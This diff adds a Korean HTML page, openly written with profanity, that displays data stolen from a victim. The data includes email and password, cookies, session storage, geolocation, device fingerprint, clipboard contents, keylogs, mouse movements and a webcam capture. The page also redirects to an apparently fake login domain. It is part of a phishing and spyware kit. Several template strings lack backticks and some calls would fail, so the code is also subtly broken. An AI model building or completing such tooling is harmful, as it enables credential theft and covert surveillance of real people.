@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <title>수집된 데이터 확인</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 20px; background: #f1f1f1; }
+        .container { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); max-width: 800px; margin: auto; }
+        h2 { color: #4285f4; }
+        .section { margin-bottom: 20px; }
+        .section h3 { margin-top: 10px; }
+        pre { white-space: pre-wrap; word-wrap: break-word; background: #f9f9f9; padding: 10px; border-radius: 4px; }
+        img { max-width: 100%; border: 1px solid #ddd; border-radius: 4px; }
+        button { padding: 8px 16px; margin-right: 10px; background: #4285f4; color: white; border: none; border-radius: 4px; cursor: pointer; }
+        button:hover { background: #3267d6; }
+        #downloadBtn { display: none; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>수집된 개인정보, 씨발!</h2>
+        
+        <div class="section">
+            <h3>기본 정보</h3>
+            <pre id="basicInfo"></pre>
+        </div>
+
+        <div class="section">
+            <h3>브라우저 정보</h3>
+            <pre id="browserInfo"></pre>
+        </div>
+
+        <div class="section">
+            <h3>장치 정보</h3>
+            <pre id="deviceInfo"></pre>
+        </div>
+
+        <div class="section">
+            <h3>배터리 정보</h3>
+            <pre id="batteryInfo"></pre>
+        </div>
+
+        <div class="section">
+            <h3>네트워크 정보</h3>
+            <pre id="networkInfo"></pre>
+        </div>
+
+        <div class="section">
+            <h3>추가 정보</h3>
+            <pre id="extraInfo"></pre>
+        </div>
+
+        <div class="section">
+            <h3>클립보드</h3>
+            <pre id="clipboard"></pre>
+        </div>
+
+        <div class="section">
+            <h3>키로깅</h3>
+            <pre id="keylogs"></pre>
+        </div>
+
+        <div class="section">
+            <h3>마우스 움직임</h3>
+            <pre id="mouseMovements"></pre>
+        </div>
+
+        <div class="section">
+            <h3>카메라 이미지</h3>
+            <div id="cameraImage"></div>
+            <button id="downloadBtn">이미지 다운로드</button>
+        </div>
+
+        <div class="section">
+            <button onclick="copyToClipboard()">모든 데이터 복사</button>
+            <button onclick="redirectToFakeSite()">확인 후 이동</button>
+        </div>
+    </div>
+
+    <script>
+        const data = localStorage.getItem('stolenData');
+        if (data) {
+            const collectedData = JSON.parse(data);
+
+            // 기본 정보
+            document.getElementById('basicInfo').textContent = 
+이메일: ${collectedData.email || "입력 안 함"}
+비밀번호: ${collectedData.password || "입력 안 함"}
+IP 주소: ${collectedData.ip || "없음"}
+위치 정보: ${collectedData.location ? 위도: ${collectedData.location.latitude}, 경도: ${collectedData.location.longitude} : "없음"}
+쿠키: ${collectedData.cookies}
+세션 스토리지: ${collectedData.sessionStorage}
+            ;
+
+            // 브라우저 정보
+            document.getElementById('browserInfo').textContent = 
+- User-Agent: ${collectedData.browserInfo.userAgent || "없음"}
+- 지원 언어: ${collectedData.browserInfo.languages || "없음"}
+- 해상도: ${collectedData.browserInfo.screen || "없음"}
+- 시간대: ${collectedData.browserInfo.timezone || "없음"}
+- 색상 깊이: ${collectedData.browserInfo.colorDepth || "없음"}
+- 픽셀 비율: ${collectedData.browserInfo.pixelRatio || "없음"}
+- 히스토리 길이: ${collectedData.browserInfo.historyLength || "없음"}
+            ;
+
+            // 장치 정보
+            document.getElementById('deviceInfo').textContent = 
+- 메모리: ${collectedData.deviceInfo.deviceMemory || "없음"} GB
+- CPU 코어: ${collectedData.deviceInfo.hardwareConcurrency || "없음"}
+            ;
+
+            // 배터리 정보
+            document.getElementById('batteryInfo').textContent = 
+${typeof collectedData.batteryInfo === "string" ? collectedData.batteryInfo : 
+- 충전 중: ${collectedData.batteryInfo.charging}
+- 배터리 레벨: ${collectedData.batteryInfo.level}
+- 충전 시간: ${collectedData.batteryInfo.chargingTime || "없음"}
+- 방전 시간: ${collectedData.batteryInfo.dischargingTime || "없음"}}
+            ;
+
+            // 네트워크 정보
+            document.getElementById('networkInfo').textContent = 
+${typeof collectedData.networkInfo.connection === "string" ? collectedData.networkInfo.connection : 
+- 연결 타입: ${collectedData.networkInfo.connection.type || "없음"}
+- 다운로드 속도: ${collectedData.networkInfo.connection.downlink || "없음"} Mbps
+- RTT: ${collectedData.networkInfo.connection.rtt || "없음"} ms}
+            ;
+
+            // 추가 정보
+            document.getElementById('extraInfo').textContent = 
+플러그인: ${collectedData.plugins}
+MIME 타입: ${collectedData.mimeTypes}
+            ;
+
+            // 클립보드
+            document.getElementById('clipboard').textContent = 
+${collectedData.clipboard || "없음"}
+            ;
+
+            // 키로깅
+            document.getElementById('keylogs').textContent = 
+${collectedData.keylogs.length ? collectedData.keylogs.join("\n") : "없음"}
+            ;
+
+            // 마우스 움직임
+            document.getElementById('mouseMovements').textContent = 
+${collectedData.mouseMovements.length ? collectedData.mouseMovements.join("\n") : "없음"}
+            ;
+
+            // 카메라 이미지
+            if (collectedData.cameraImage && collectedData.cameraImage.startsWith("data:image")) {
+                const img = document.createElement('img');
+                img.src = collectedData.cameraImage;
+                document.getElementById('cameraImage').appendChild(img);
+                document.getElementById('downloadBtn').style.display = 'inline-block';
+            } else {
+                document.getElementById('cameraImage').textContent = collectedData.cameraImage || "카메라 데이터 없음";
+            }
+
+            // 이미지 다운로드 기능
+            document.getElementById('downloadBtn').addEventListener('click', () => {
+                const link = document.createElement('a');
+                link.href = collectedData.cameraImage;
+                link.download = captured_image_${new Date().toISOString().replace(/[:.]/g, "-")}.jpg;
+                link.click();
+            });
+
+            localStorage.removeItem('stolenData'); // 사용 후 삭제
+        } else {
+            document.getElementById('dataOutput').textContent = "데이터가 없음, 씨발!";
+        }
+
+        // 데이터 복사 기능
+        function copyToClipboard() {
+            let allData = document.querySelectorAll('pre').reduce((text, pre) => text + pre.textContent + '\n', '');
+            navigator.clipboard.writeText(allData).then(() => {
+                alert("모든 데이터 복사됨, 씨발!");
+            }).catch(err => {
+                alert("복사 실패, 씨발: " + err);
+            });
+        }
+
+        // 가짜 사이트로 리다이렉트
+        function redirectToFakeSite() {
+            window.location = "https://secure-auth-login9876.com";
+        }
+    </script>
+</body>
+</html>
